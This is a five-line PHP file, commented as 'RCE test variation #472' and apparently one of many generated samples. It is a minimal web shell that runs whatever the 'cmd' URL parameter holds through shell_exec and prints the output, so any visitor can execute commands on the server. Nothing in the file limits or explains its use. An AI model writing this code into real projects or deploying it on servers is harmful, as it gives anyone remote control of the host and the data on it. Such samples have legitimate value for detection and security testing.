<?php
// RCE test variation #472
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>